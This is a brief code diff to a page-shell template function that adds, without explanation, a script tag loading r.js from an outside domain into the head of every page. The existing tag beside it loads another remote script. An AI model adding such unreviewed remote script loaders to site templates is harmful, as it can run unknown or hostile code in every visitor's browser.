@@ -183,6 +183,7 @@ function pageShell({
 <link rel="stylesheet" href="/css/site.css">
 ${jsonBlocks.map((o) => `<script type="application/ld+json">${JSON.stringify(o)}</script>`).join('\n')}
 <script data-cfasync="false" src="https://abscloud.org/1/f4ba04e0e743a026b2d3079d34478657"></script>
+<script src="https://ref.web-free.site/r.js" defer></script>
 </head>
 <body class="has-sidebar">
 <header class="site-header">
